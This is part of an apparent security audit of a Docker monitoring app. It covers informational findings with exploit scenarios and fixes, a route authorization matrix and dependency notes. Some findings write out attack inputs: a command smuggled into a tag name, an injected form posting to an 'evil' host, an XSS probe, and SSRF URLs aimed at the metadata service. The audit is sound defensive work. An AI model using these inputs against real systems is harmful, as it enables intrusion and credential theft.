**Fix.** Enable 'require actions to be pinned to a full-length SHA' and restrict allowed actions; add CODEOWNERS for .github/.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-34 — Template expansion of needs.tag.outputs.tag inside a run: script (zizmor template-injection), currently neutralised by the tag regex

- **Location:** `.github/workflows/release.yml:167-183`
- **CWE / OWASP:** CWE-94 / A03:2021 · **Confidence:** confirmed · **Layer:** cicd
- **Merged from:** CICD-003
- **Preconditions:** Regex in the tag job weakened or removed.

**Evidence**

```
run: |
  ...
  echo "### Trivy: ${{ needs.tag.outputs.tag }} (linux/amd64)"
```

**Exploit scenario.** Not exploitable today: the tag job only emits a value matching ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$, which contains no shell metacharacters. If the validation is ever loosened or the output source changes, a crafted tag name such as v1.0.0-$(curl ...) would execute in the publish job, which later holds Docker Hub credentials.

**Fix.** Pass the tag through env: TAG and reference "$TAG" in the script.

**Status:** Fixed in 2c7e27a

### [INFO] CY-35 — Build stage `COPY . .` relies on a .dockerignore that does not exclude key/credential file patterns

- **Location:** `Dockerfile:25-27`; `.dockerignore:10-13`; `.github/workflows/release.yml:239-240`
- **CWE / OWASP:** CWE-538 / A05:2021 · **Confidence:** confirmed · **Layer:** containers
- **Merged from:** CONTAINERS-006
- **Preconditions:** Local build from a directory containing an un-ignored secret file.

**Evidence**

```
Dockerfile: COPY . .
.dockerignore: .env / .env.* / !.env.example (no *.pem, *.key, *service-account*.json, .npmrc, .secrets*)
```

**Exploit scenario.** The final runtime stage copies only dist/, node_modules, schema/seed and entrypoint, so the published image does not contain the build context. However, a local `docker compose build` from a working tree that holds e.g. the Firebase service-account JSON (DEPLOYMENT/.env.example suggests a host path, but operators often drop it next to the repo) or an .npmrc with a registry token puts that file into the build-stage layer and BuildKit cache (mode=max in CI caches intermediate stages). Anyone who later pushes with `--target build` or exports the cache gets the secret. CI builds from a clean checkout, so the released images are not affected.

**Fix.** Add *.pem, *.key, *.p12, *service-account*.json, .npmrc, .secrets* to .dockerignore.

**Status:** Fixed in 30fe7ed

### [INFO] CY-36 — Docker socket mounted read-write with no working read-only / socket-proxy mode

- **Location:** `docker-compose.yml:27, 32, 104-122`; `server/src/config/hosts.ts:19-27`; `server/src/services/docker.ts:50-54, 470-489`
- **CWE / OWASP:** CWE-250 / A05:2021 · **Confidence:** confirmed · **Layer:** containers
- **Merged from:** CONTAINERS-003
- **Preconditions:** Code execution in the app container or ADMIN session.

**Evidence**

```
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
# Note: Dockerode uses unix sockets; to use a TCP socket proxy you would need a socat UNIX-to-TCP bridge...
config/hosts.ts: const dockerSocketPath = env.DOCKER_HOST.replace(/^unix:\/\//, "") || "/var/run/docker.sock";
services/docker.ts: client = new Docker({ socketPath }); ... case "remove": await container.remove({ force: true });
```

**Exploit scenario.** Documented design choice. All lifecycle actions are ADMIN-only (requireAdminAudited / requireAdminStackAudited; inspect checks role === ADMIN) and no non-ADMIN path to a mutating socket call was found. The residual risk: any RCE or dependency compromise in the Node process (or an ADMIN session takeover) yields full Docker API = host root, because the app needs only list/inspect/logs/stats/start/stop/restart/pause/remove but holds the whole API. A DOCKER_HOST=tcp://... value is silently turned into a nonsensical socketPath, so the commented tecnativa socket-proxy example cannot be used as written.

**Fix.** Offer a supported socket-proxy mode (dockerode over TCP to tecnativa/docker-socket-proxy with POST limited to the needed actions).

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-37 — Redis password also exposed via REDIS_URL / REDISCLI_AUTH env and process argv on the host

- **Location:** `docker-compose.yml:26`; `docker-compose.yml:63-66`; `docker-compose.yml:74-75`
- **CWE / OWASP:** CWE-214 / A05:2021 · **Confidence:** confirmed · **Layer:** containers
- **Merged from:** CONTAINERS-002
- **Preconditions:** Local shell on the Docker host (any user) for the ps path; Docker access for inspect (already root-equivalent).

**Evidence**

```
REDIS_URL: redis://:${REDIS_PASSWORD}@redis:6379/0
...
command: [redis-server, --requirepass, ${REDIS_PASSWORD:?...}]
environment:
  REDISCLI_AUTH: ${REDIS_PASSWORD}
```

**Exploit scenario.** Any local user on the Docker host who can run `ps aux` sees `redis-server --requirepass <pw>` (argv of the containerised process is visible in the host PID namespace). `docker inspect` shows it in Config.Cmd and Config.Env. Users with Docker access are already root-equivalent, so the incremental impact is limited to unprivileged local users reading /proc/<pid>/cmdline on the host.

**Fix.** Pass the Redis password via a config file or REDIS_PASSWORD-backed entrypoint instead of argv.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-38 — adm group (host log readers) added to the app user in the base compose even without the host-logs overlay

- **Location:** `docker-compose.yml:37-39`; `deploy/hostlogs/docker-compose.hostlogs.yml:15-17`
- **CWE / OWASP:** CWE-250 / A05:2021 · **Confidence:** confirmed · **Layer:** containers
- **Merged from:** CONTAINERS-005
- **Preconditions:** Additional host mounts by the operator.

**Evidence**

```
group_add:
  - "${DOCKER_GID:-113}"
  - "${ADM_GID:-4}"
```

**Exploit scenario.** No direct exploit: host log directories are only bind-mounted by the overlay. Least-privilege gap: if an operator adds any other host mount (the commented lines 35-36, or /var/log wholesale) the app process can read every adm-group file there (auth.log, syslog with secrets in command lines).

**Fix.** Move the ADM_GID group_add into deploy/hostlogs/docker-compose.hostlogs.yml.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-39 — generateRandomPassword falls back to Math.random and has modulo bias

- **Location:** `client/src/components/header/headerUtils.ts:36-48`
- **CWE / OWASP:** CWE-338 / A02:2021 · **Confidence:** confirmed · **Layer:** crypto
- **Merged from:** CRYPTO-003
- **Preconditions:** Code runs where window.crypto is unavailable.

**Evidence**

```
if (typeof window !== "undefined" && window.crypto?.getRandomValues) { window.crypto.getRandomValues(bytes); } else { for (...) bytes[i] = Math.floor(Math.random() * charset.length); }
return Array.from(bytes, (b) => charset[b % charset.length]).join("");
```

**Exploit scenario.** No practical exploit: every supported browser exposes crypto.getRandomValues, so the Math.random branch is dead in practice, and the bias of a uint32 modulo 69 is about 1e-8 per character. Listed so the fallback is removed before the helper is reused in a non-browser context (tests/SSR), where it would generate predictable admin-issued passwords.

**Fix.** Drop the Math.random branch (throw if getRandomValues is missing) and use rejection sampling.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-40 — Dependabot version updates have no cooldown, so freshly published (possibly malicious) releases are proposed immediately

- **Location:** `.github/dependabot.yml:4-17`; `.github/dependabot.yml:61-69`
- **CWE / OWASP:** CWE-1357 / A08:2021 · **Confidence:** confirmed · **Layer:** deps
- **Merged from:** DEPS-002
- **Preconditions:** Malicious version published within days of a Dependabot run and the grouped PR is merged without noticing.

**Evidence**

```
- package-ecosystem: npm
    schedule:
      interval: weekly
 ...
    groups:
      npm-minor-patch:
        update-types: [minor, patch]   (no `cooldown:` key for npm or github-actions)
```

**Exploit scenario.** 1. An attacker compromises a maintainer account of a transitive or direct npm package (as in recent npm worm incidents) and publishes a malicious patch version shortly before the Monday run. 2. Dependabot opens the grouped minor/patch PR including it. 3. CI runs `npm ci` (install scripts execute on the runner, no secrets) and, if merged before the registry pulls the version, it lands in the next release image. A cooldown of a few days lets the registry and the community detect and unpublish most such releases first.

**Fix.** Add cooldown: default-days: 3 (or similar) to both ecosystems.

**Status:** Fixed in bfe4c4f

### [INFO] CY-41 — Unused runtime dependencies ws and bufferutil (native addon with install script) shipped in the production image

- **Location:** `package.json:38`; `package.json:92-94`
- **CWE / OWASP:** CWE-1104 / A06:2021 · **Confidence:** confirmed · **Layer:** deps
- **Merged from:** DEPS-001
- **Preconditions:** Future vulnerable or malicious release of ws or bufferutil.

**Evidence**

```
"ws": "^8.18.0", ... "optionalDependencies": { "bufferutil": "^4.0.8" }  -- no import/require of 'ws' or 'bufferutil' anywhere in server/, client/, shared/, scripts/, e2e/; `npm ls ws` shows it only as a root dependency (8.22.1); package-lock marks bufferutil@4.1.0 hasInstallScript:true
```

**Exploit scenario.** No direct exploit path today. Both packages are installed into the runtime image by `npm ci --omit=dev` and bufferutil runs a native build/install script in CI and builder stages. A future CVE in ws or a compromised bufferutil release would reach the image and CI runners although the code never uses them, and Dependabot/Trivy would raise alerts that cost triage time.

**Fix.** Remove ws and bufferutil from package.json and regenerate the lockfile.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-42 — Deploy script pulls a mutable tag and does not pin or verify the image digest/provenance

- **Location:** `scripts/docker-deploy.sh:98, 125-132, 155-156`; `docker-compose.yml:16`
- **CWE / OWASP:** CWE-494 / A08:2021 · **Confidence:** confirmed · **Layer:** infra
- **Merged from:** INFRA-009
- **Preconditions:** Registry account/token compromise.

**Evidence**

```
IMAGE="0xwulf/containeryard:${TAG}"
run docker pull "$IMAGE"
... log "Image metadata: digest=${DIGEST} ..."
image: 0xwulf/containeryard:${CY_TAG:-latest}
```

**Exploit scenario.** The release workflow produces SBOM + provenance attestations, but deploy only logs the digest. If the Docker Hub account or a token with push rights is compromised, an attacker re-pushes an existing tag; the next deploy (or a `docker compose pull` with the :latest default) runs the malicious image with the Docker socket mounted, i.e. host root. Nothing compares the pulled digest with the one published by CI.

**Fix.** Optionally verify the pulled digest against the release attestation (docker buildx imagetools / cosign) and pin by digest.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-43 — PM2 host-log resolution follows symlinks in the PM2 log directory

- **Location:** `server/src/services/hostLogs/localProvider.ts:107-138`; `server/src/services/hostLogs/localProvider.ts:233-240`; `server/src/services/hostLogs/localProvider.ts:438-452`
- **CWE / OWASP:** CWE-59 / A01:2021 · **Confidence:** confirmed · **Layer:** injection
- **Merged from:** INJECTION-005
- **Preconditions:** Write access to the mounted PM2 log directory; only ADMIN users see the result.

**Evidence**

```
entries.filter((name) => rx.test(name)).map(async (name) => {
  const file = path.join(dir, name);
  const { mtimeMs } = await fs.promises.stat(file);   // stat, not lstat
...
return (await fs.promises.stat(file)).isFile();
...
execFile("tail", ["-n", String(options.lines), "--", spec.filePath!], ...)
```

**Exploit scenario.** The :name route parameter itself is safe (Map lookup against an env-defined allowlist; tail/execFile use argv with '--', no shell). However, a process that can write into PM2_LOG_DIR (any PM2 app running as that user) can create `<app>-out-999.log -> /path/readable/by/the/CY/process` (e.g. files readable via the adm group the container is given). It becomes the 'newest' log and its contents are shown to ContainerYard admins. This crosses a small trust boundary (PM2 app user -> files readable by CY's uid/adm group), but only admins can read the output.

**Fix.** Use lstat and skip symlinks, or realpath-check that the file stays inside PM2_LOG_DIR.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-44 — Unchecked query/param shapes throw uncaught type errors (array ?since=, malformed % in cAdvisor container path)

- **Location:** `server/src/routes/stacks.ts:151-172`; `server/src/services/docker.ts:288-305`; `server/src/config/dozzle.ts:11-15`
- **CWE / OWASP:** CWE-20 / A04:2021 · **Confidence:** confirmed · **Layer:** injection
- **Merged from:** INJECTION-006
- **Preconditions:** Signed-in user.

**Evidence**

```
const since = req.query.since;            // string | string[]
... since: since as string,
// docker.ts parseSince: const s = since.trim();   -> TypeError for arrays
// dozzle.ts: const decoded = decodeURIComponent(containerPath);  -> URIError on '%' (sent as %25)
```

**Exploit scenario.** GET /api/hosts/<h>/stacks/<s>/logs?since=1&since=2 makes every per-container getContainerLogs throw (caught per container, so the response is a list of error lines); GET /api/hosts/<cadvisorHost>/containers/%25/logs throws URIError -> 500. Impact is limited to error responses/log noise; no injection.

**Fix.** Coerce query values with typeof checks (take first array element) and wrap decodeURIComponent in try/catch.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-45 — Logout and authorization denials are not audited

- **Location:** `server/src/routes/auth.ts:348-361`; `server/src/middleware/auth.ts:151-166`
- **CWE / OWASP:** CWE-778 / A09:2021 · **Confidence:** confirmed · **Layer:** logging
- **Merged from:** LOGGING-004
- **Preconditions:** Authenticated user.

**Evidence**

```
router.post("/logout", requireAuth, (req, res, next) => { req.session.destroy(...) })  // no recordAudit
if (!roles.includes(req.session.user!.role)) { return res.status(403).json({ message: "Insufficient permissions" }); } // no recordAudit
```

**Exploit scenario.** A VIEWER probing ADMIN-only endpoints (users, audit, alert writes, host logs) leaves no AuditLog trace, so privilege-probing by an insider is invisible; session end times are also missing from the timeline. Container/stack actions do audit 'denied', so coverage is inconsistent.

**Fix.** recordAudit on logout and on requireRole denials (rate-limited to avoid log flooding).

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-46 — Alert worker runs can overlap; cooldown check is a read-then-write race

- **Location:** `server/src/services/alertWorker.ts:42-48, 98-115, 333-361`
- **CWE / OWASP:** CWE-362 / A04:2021 · **Confidence:** likely · **Layer:** logic
- **Merged from:** LOGIC-001
- **Verifier:** downgraded from low — Confirmed setInterval without an in-flight guard and a read-then-write cooldown (alertWorker.ts). Downgraded: reliability bug (duplicate notifications, pile-up under a slow daemon); no attacker-controlled path beyond making containers busy.
- **Preconditions:** Enough rules/containers or a slow Docker/cAdvisor backend.

**Evidence**

```
this.interval = setInterval(() => { this.checkAlerts().catch(...) }, this.checkIntervalMs); // 30 s, no in-flight guard
... for (const rule of rules) for (const container of ...) await this.evaluateRule(...)  // sequential docker stats calls
const lastAlert = await prisma.alertHistory.findFirst(...); if (lastAlert.createdAt > fiveMinutesAgo) return; await prisma.alertHistory.create(...); await this.sendNotification(...)
```

**Exploit scenario.** 1) With R rules x C containers, each evaluation does a non-streaming docker stats call (~1-2 s), so one pass easily exceeds 30 s (e.g. 3 rules x 20 containers). 2) setInterval starts a second checkAlerts while the first is still running; both read 'no alert in last 5 min' and both create history rows and send webhooks -> duplicate notifications. 3) Under a slow Docker daemon passes pile up indefinitely, multiplying Docker API load and memory (metricsHistory also gets duplicate samples).

**Fix.** Skip a tick while checkAlerts is running (isChecking flag) or chain setTimeout after completion.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-47 — Last-admin guard is check-then-act without a transaction

- **Location:** `server/src/routes/users.ts:160-191, 281-304`; `server/prisma/seed.js:23-27`
- **CWE / OWASP:** CWE-367 / A04:2021 · **Confidence:** confirmed · **Layer:** logic
- **Merged from:** LOGIC-003
- **Verifier:** downgraded from low — Confirmed count-then-update without a transaction (users.ts:160-191, 281-304). Downgraded: requires two ADMINs demoting/deleting each other within the same moment; outcome is a recoverable lockout (DB edit), no privilege gain.
- **Preconditions:** Two ADMIN sessions acting concurrently (hostile co-admin or a scripted attack with one stolen session racing a legitimate admin).

**Evidence**

```
const adminCount = await prisma!.user.count({ where: { role: "ADMIN" } });
const guard = evaluateUserMutationGuard({ ..., adminCount });
... await prisma!.user.update({ where: { id: target.id }, data: { role: newRole, ... } })
// seed.js: if (userCount > 0) { console.log("Users already exist, skipping bootstrap admin creation"); return; }
```

**Exploit scenario.** Two admins A and B (count=2). A sends PATCH /api/users/B {role:'VIEWER'} while B sends PATCH /api/users/A {role:'VIEWER'} (or DELETE each other). Both requests read adminCount=2, both pass the guard, both commit -> zero admins. The bootstrap seed only runs when the user table is empty, so the instance cannot be administered again without editing the SQLite file by hand.

**Fix.** Do the admin count and the update inside prisma.$transaction (interactive) and re-check the count before commit.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-48 — durationMinutes is not enforced: rules fire on the first sample and windows >10 min are truncated

- **Location:** `server/src/services/alertWorker.ts:186-190, 226-242`
- **CWE / OWASP:** CWE-840 / A04:2021 · **Confidence:** confirmed · **Layer:** logic
- **Merged from:** LOGIC-002
- **Verifier:** downgraded from low — Confirmed: history is trimmed to 10 minutes and every() over one sample is true, so durationMinutes is not honoured. Downgraded: alerting correctness bug, not a security boundary.
- **Preconditions:** Rule with durationMinutes > 0.

**Evidence**

```
const tenMinutesAgo = Date.now() - 10 * 60 * 1000; // history trimmed to 10 min
const relevantHistory = history.stats.filter((_, i) => Date.now() - history.timestamps[i] <= durationMs);
triggered = relevantHistory.length > 0 && relevantHistory.every(...)
```

**Exploit scenario.** Rule 'cpu > 90 for 15 minutes'. Right after a restart (or for a newly created container) history holds one sample, so a single 30-second spike satisfies `every()` and the alert fires immediately. For durationMinutes >= 10 the check never looks past 10 minutes, so 'for 60 minutes' behaves like 'for 10 minutes'. A workload that spikes briefly (or a container an attacker can make spike) generates alerts the operator explicitly tried to suppress.

**Fix.** Keep history for max(durationMinutes) and require samples covering the full window before triggering.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-49 — .gitignore does not cover key or service-account files

- **Location:** `.gitignore:Environment files section (.env, .env.*, !.env.example)`; `.dockerignore:Environment & secrets section`
- **CWE / OWASP:** CWE-538 / A05:2021 · **Confidence:** confirmed · **Layer:** secrets
- **Merged from:** SECRETS-004
- **Preconditions:** Operator or contributor places a key file inside the checkout.

**Evidence**

```
# Environment files
.env
.env.*
!.env.example
(no *.pem, *.key, *.p12, *service-account*.json, firebase-sa*.json patterns)
```

**Exploit scenario.** No current exploit path: no key material is tracked and the documented service-account location is outside the repo. If a contributor drops a Firebase service-account JSON or TLS key into the working tree, `git add -A` would stage it, and a public push would leak a credential with Firebase Admin rights. Also `COPY . .` in the Dockerfile build stage would pull it into the build context (build stage only, not the runtime image).

**Fix.** Add *.pem, *.key, *.p12, *service-account*.json, firebase-sa*.json to .gitignore.

**Status:** Fixed in 30fe7ed

### [INFO] CY-50 — /api/runtime-config echoes the Host header into apiBase (unused by the client)

- **Location:** `server/src/routes/runtimeConfig.ts:6-14`; `client/src/lib/api.ts:5-14`; `client/src/lib/authBootstrap.ts:15-38`
- **CWE / OWASP:** CWE-644 / A05:2021 · **Confidence:** confirmed · **Layer:** web
- **Merged from:** WEB-005
- **Preconditions:** Future client change plus a cache that keys without Host.

**Evidence**

```
const apiBase = process.env.PUBLIC_API_BASE ?? `${protocol}://${req.headers.host ?? "localhost"}`;
...
// api.ts, evaluated at module load before bootstrapRuntimeConfig() runs:
const runtimeBase = typeof window !== 'undefined' && window.__CY_API_BASE__ ? window.__CY_API_BASE__ : '';
```

**Exploit scenario.** Not exploitable: API_BASE in client/src/lib/api.ts is computed when the module loads, before App.tsx calls bootstrapRuntimeConfig(), so it stays '/api' and the poisoned apiBase is never used for requests. The response also has no cacheable headers and the CDN bypasses /api. If a later refactor reads window.__CY_API_BASE__ lazily, a Host-header-poisoned cached response could send credentialed requests and CSRF tokens to an attacker host.

**Fix.** Return a relative apiBase ('/api') unless PUBLIC_API_BASE is set.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-51 — CSP allows 'unsafe-inline' styles and lacks form-action / script-src-attr

- **Location:** `server/src/lib/csp.ts:26-39, 45-65`
- **CWE / OWASP:** CWE-1021 / A05:2021 · **Confidence:** confirmed · **Layer:** web
- **Merged from:** WEB-004
- **Preconditions:** A future HTML injection bug.

**Evidence**

```
useDefaults: false, directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], styleSrc: ["'self'", "'unsafe-inline'", ...], frameAncestors: ["'self'"], objectSrc: ["'none'"], baseUri: ["'self'"] }
```

**Exploit scenario.** No HTML-injection sink was found in the client (no dangerouslySetInnerHTML/innerHTML; logs, container names and labels are rendered as React text), so there is no exploit path. With useDefaults:false the policy omits form-action and upgrade-insecure-requests; if an HTML injection appeared later, an injected <form action=https://evil> or CSS-based exfiltration would not be blocked.

**Fix.** Add form-action 'self' and script-src-attr 'none' to both CSP variants.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-52 — Non-API error handler reflects error messages as text/html

- **Location:** `server/src/index.ts:213-232`
- **CWE / OWASP:** CWE-79 / A03:2021 · **Confidence:** confirmed · **Layer:** web
- **Merged from:** WEB-007
- **Preconditions:** None practical.

**Evidence**

```
// Non-API: plain text fallback
res.status(status).send(message);
```

**Exploit scenario.** Local probe with the same middleware stack: POST /login with Content-Type: application/json and body '<img src=x onerror=...>' returns 400 text/html with body: Unexpected token '<', "<img src=x"... is not valid JSON. The reflection is cut to 10 characters, requires a JSON content type (a cross-site form cannot send one, so it cannot be triggered by navigation), and production CSP (script-src 'self') blocks inline handlers. No exploit path; it is a latent sink that a future error message with user input could turn into reflected XSS.

**Fix.** Send non-API errors with res.type('text/plain').

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-53 — Webhook SSRF guard does not block NAT64 / 6to4 / IPv4-compatible IPv6 encodings

- **Location:** `server/src/lib/safeWebhook.ts:39-60, 80-84`
- **CWE / OWASP:** CWE-918 / A10:2021 · **Confidence:** confirmed · **Layer:** web
- **Merged from:** WEB-006
- **Preconditions:** ADMIN account; deployment network with NAT64 or 6to4 routing.

**Evidence**

```
alwaysBlocked.addSubnet("169.254.0.0", 16, "ipv4"); ... privateRanges.addAddress("::1", "ipv6"); privateRanges.addSubnet("fc00::", 7, "ipv6");
function normalizeIp(ip) { const mapped = /^::ffff:(\d+\.\d+\.\d+\.\d+)$/i.exec(ip); ... }
```

**Exploit scenario.** Probe (npx tsx, local only): http://[64:ff9b::a9fe:a9fe]/, http://[2002:a9fe:a9fe::]/ and http://[::127.0.0.1]/ pass validateWebhookUrl with the strict policy. On this host the connect fails with ENETUNREACH, so there is no live path. On a host with a NAT64 gateway (IPv6-only cloud), an ADMIN could aim a webhook at 64:ff9b::a9fe:a9fe to reach the cloud metadata service; impact is limited because the request is a POST, only the status code is returned, and only ADMINs can create channels. Everything else holds: decimal/octal/short IPv4 forms are normalised by WHATWG URL and blocked, ::ffff:x mapped forms are blocked (Node BlockList), localhost. is blocked by the connect-time lookup, metadata stays blocked with WEBHOOK_ALLOW_PRIVATE, redirects are not followed, and the connect-time lookup prevents DNS rebinding.

**Fix.** Unwrap NAT64/6to4/IPv4-compatible addresses in normalizeIp (or block those prefixes outright).

**Status:** Not fixed (info): reported as a recommendation, see section 8.

## 5. Route / endpoint access matrix

Verified route by route at the audited commit; the matrix was re-checked by the verifier. After this PR, VIEWER
responses for `GET /api/alerts/channels*` and `GET /api/hosts/:hostId/containers/:containerId` are redacted (CY-02, CY-03),
`VITE_AUTH_DISABLED` no longer affects the server, and `AUTH_DISABLED` is refused in production (CY-07). The Express 5
upgrade was probed with 50 path variants (trailing slash, case, double slash, encoded slash): every guard still matched.

Legend: **public** = no session needed; **auth** = any signed-in user (ADMIN or VIEWER); **ADMIN** = role check.
All mutating `/api/*` requests also pass `verifyCsrf` (token + Origin), mounted at `app.use("/api")` (case-insensitive, so `/API/...` is covered too).
With `AUTH_DISABLED=true` or `VITE_AUTH_DISABLED=true`, every "auth" and "ADMIN" row below becomes public ADMIN (AUTHZ-003).

| Method | Path | Auth required | Authorization check | Notes |
|---|---|---|---|---|
| GET | /api/health | public | none | Before session; uptime only |
| GET | /health | public | none | Same as above |
| GET | /api/auth/config | public | none | Firebase public web config |
| POST | /api/auth/login | public | none | loginRateLimiter; session regenerate; CSRF token required (anon session) |
| POST | /api/auth/firebase-login | public | allowlist + existing user row | rate-limited; no auto-provisioning |
| ALL | /api/auth/firebase-login (non-POST) | public | none | 405 |
| POST | /api/auth/change-password | auth | self only (session id) | rate-limited; requires current password; bumps sessionVersion |
| POST | /api/auth/logout | auth | none | |
| GET | /api/auth/me | auth | self | |
| GET | /api/auth/csrf | public | none | 30-min anon session |
| GET | /api/runtime-config | public | none | Echoes Host header into apiBase (not authz) |
| GET | /metrics | public if METRICS_TOKEN unset, else token | x-metrics-token | prom-client default process metrics only |
| GET | /api/containers[?host=] | auth | none | All containers incl. labels for any user |
| GET | /api/hosts | auth | none | id/name/provider/nodeLabel/dozzleUrl |
| GET | /api/hosts/:hostId/stats | auth | none | |
| GET | /api/hosts/:hostId/containers | auth | none | Summary incl. all labels |
| GET | /api/hosts/:hostId/containers/:containerId | auth | env values redacted for non-ADMIN | **command, mounts, labels NOT redacted** (AUTHZ-002) |
| GET | /api/hosts/:hostId/containers/:containerId/stats | auth | none | containerId regex-checked |
| GET | /api/hosts/:hostId/containers/:containerId/logs | auth | none | Up to 5000 lines, unredacted (AUTHZ-004) |
| GET | /api/hosts/:hostId/containers/:containerId/logs/stream | auth | SSE heartbeat re-validates session | 6 streams/user; unredacted (AUTHZ-004) |
| GET | /api/hosts/:hostId/containers/:id/inspect | auth (inline requireAuth + mount-level requireAuth) | ADMIN for DOCKER; any user for CADVISOR_ONLY (reduced spec) | Root-mounted router; only this one path; verified guarded incl. case/trailing-slash variants |
| GET | /api/hosts/:hostId/stacks | auth (mount) | none | |
| GET | /api/hosts/:hostId/stacks/:name | auth (mount) | none | |
| POST | /api/hosts/:hostId/stacks/:name/action | auth (mount) | ADMIN (requireAdminStackAudited, re-verifies session) | actionRateLimiter; denied attempts audited |
| GET | /api/hosts/:hostId/stacks/:name/logs | auth (mount) | none | Combined stack logs (AUTHZ-004) |
| POST | /api/hosts/:hostId/containers/:containerId/actions | auth (mount) | ADMIN (requireAdminAudited reads session role refreshed by mount requireAuth) | rate-limited; audited; containerId regex |
| GET | /api/hosts/:hostId/containers/:containerId/metrics/history | auth (mount) | none | |
| GET | /api/hosts/:hostId/metrics/summary | auth (mount) | none | |
| GET | /api/hosts/:hostId/metrics/top-cpu | auth (mount) | none | |
| GET | /api/hosts/:hostId/metrics/top-memory | auth (mount) | none | |
| GET | /api/hosts/:hostId/metrics/export/csv | auth (mount) | none | CSV injection = other layer |
| GET | /api/hosts/:hostId/containers/:containerId/metrics/export/csv | auth (mount) | none | |
| GET | /api/hosts/:hostId/summary | auth (mount + inline) | none | |
| GET | /api/hosts/:hostId/logs | auth (mount) | ADMIN (per-route) | Host log sources |
| GET | /api/hosts/:hostId/logs/:name[?follow=1] | auth (mount) | ADMIN (per-route; SSE heartbeat re-checks ADMIN) | Snapshot audited; `%2F` decodes into :name (path handling = other layer) |
| GET | /api/logs/download | ADMIN | requireRole(ADMIN) | scope=container duplicates viewer-readable data (AUTHZ-004) |
| GET | /api/alerts/channels | auth | none (GET open to VIEWER) | **Returns full `config` incl. webhook URL + headers** (AUTHZ-001) |
| GET | /api/alerts/channels/:id | auth | none | Same as above |
| POST | /api/alerts/channels | auth | ADMIN (router.use method gate) | Zod-picked fields, no mass assignment; SSRF guard |
| PATCH | /api/alerts/channels/:id | auth | ADMIN | Explicit field copy |
| DELETE | /api/alerts/channels/:id | auth | ADMIN | |
| POST | /api/alerts/channels/:id/test | auth | ADMIN | Outbound webhook |
| GET | /api/alerts/rules | auth | none | |
| GET | /api/alerts/rules/:id | auth | none | |
| POST | /api/alerts/rules | auth | ADMIN | Explicit fields |
| PATCH | /api/alerts/rules/:id | auth | ADMIN | Explicit fields |
| DELETE | /api/alerts/rules/:id | auth | ADMIN | |
| GET | /api/alerts/history | auth | none | |
| POST | /api/alerts/history/:id/acknowledge | auth | ADMIN | acknowledgedBy from body (AUTHZ-005) |
| DELETE | /api/alerts/history?days= | auth | ADMIN | Not audited (AUTHZ-005) |
| OPTIONS/PUT/other | /api/alerts/* | auth | ADMIN (gate is default-deny for every method except GET/HEAD) | Probe: OPTIONS -> 401/403, HEAD -> GET handler (read-only) |
| GET | /api/bookmarks[?containerId=] | auth | owner (where userId = session) | No IDOR |
| POST | /api/bookmarks | auth | owner (userId from session) | Zod-picked fields |
| DELETE | /api/bookmarks/:id | auth | owner (deleteMany where id+userId) | No IDOR |
| GET | /api/saved-searches | auth | owner | |
| POST | /api/saved-searches | auth | owner | |
| DELETE | /api/saved-searches/:id | auth | owner | |
| GET | /api/audit | auth (mount) | ADMIN (route) | |
| GET | /api/users | ADMIN | requireRole(ADMIN) at mount | No password hashes |
| POST | /api/users | ADMIN | mount | Zod {email, role, password} only |
| PATCH | /api/users/:id | ADMIN | mount + self-demote / last-admin guard | Zod {role} only, sessionVersion server-side; no mass assignment |
| POST | /api/users/:id/reset-password | ADMIN | mount | Bumps sessionVersion |
| DELETE | /api/users/:id | ADMIN | mount + self-delete / last-admin guard | |
| ALL | /api/{*splat} | public | none | JSON 404 (`/api` bare falls to SPA, harmless) |
| GET | /^\/(?!api\/).*/ (SPA) | public | none | index.html; case-sensitive regex, `/API/x` hits the 404 instead |

## Express 5 matching probe (probes/mounts.cjs, repo's express 5.3.0)
Reproduced the exact mount order with stub guards. Results: every guarded route stayed guarded for trailing slash (`/inspect/`, `/action/`),
upper case (`/API/USERS`, `/API/hosts/.../INSPECT`, `/api/AUDIT/`), doubled slashes (`/api//hosts`, `/api/hosts//h1/logs` -> 404),
and encoded slashes (`/api%2Fusers`, `/%61pi/users` -> SPA, never a handler). `%2F` inside `:hostId`/`:containerId`/`:name` is decoded into the param
but does not change which route or guard matches. hostsRouter (mounted without requireAuth) has requireAuth on all 7 of its routes and
none of its patterns shadows a stacks/actions/metrics/summary/hostLogs/inspect path. No unguarded alternative mount for any route.

## 6. Dependency summary

- `npm audit` (production and all dependencies): **0 vulnerabilities**. Trivy on `package-lock.json`: 0. Lockfile v3, every
  package from registry.npmjs.org with integrity hashes; no git or tarball sources.
- Security-relevant versions checked: express 5.3.0, express-session 1.19.0, connect-redis 11.0.0, helmet 8.3.0,
  express-rate-limit 7.5.1, dockerode 5.0.0, firebase-admin 14.5.1, bcrypt 6.0.0, prisma 6.19.3. None in a known-bad range.
- No dependency was upgraded in this PR. Unused `ws` / `bufferutil` (CY-41) are a cleanup recommendation.

## 7. Positive observations

- bcrypt cost 12, 72-byte limit enforced, dummy-hash compare for unknown e-mails, identical error messages (no enumeration).
- Session regenerated on login, Google login and password change; logout destroys the server-side session; `sessionVersion` revocation on password change, reset and role change.
- Synchronizer CSRF token on every mutating `/api` request plus an Origin check; CORS reflects exact allowed origins only; `null` origin rejected.
- Firebase ID tokens verified with `checkRevoked`, audience/project, `email_verified`, `google.com` provider and an allowlist re-checked on every request.
